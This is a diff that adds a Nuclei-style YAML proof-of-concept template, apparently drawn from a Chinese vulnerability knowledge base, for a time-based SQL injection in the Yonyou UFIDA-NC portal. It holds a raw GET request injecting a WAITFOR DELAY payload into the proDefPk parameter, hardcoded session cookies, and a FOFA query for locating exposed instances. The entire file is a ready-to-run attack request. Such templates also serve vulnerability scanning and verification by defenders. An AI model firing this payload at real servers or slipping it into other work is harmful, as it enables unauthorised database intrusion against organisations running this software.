@@ -1,0 +1,33 @@
+id: poc-zd2c3aruh6epf2g9
+info:
+  name: 用友-UFIDA-NC open存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zd2c3aruh6epf2g9'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zd2c3aruh6epf2g9
+    fofa: app="用友-UFIDA-NC"
+http:
+- raw:
+  - 'GET /portal/pt/PaWfm2/open?pageId=login&proDefPk=1%27WAITFOR%20DELAY%20%270%3a0%3a5%27-- HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: JSESSIONID=55136040CBCE352A0833560F840D4104.server; JSESSIONID=105993D122412CBD02ADD12E4C41C4AF.server
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
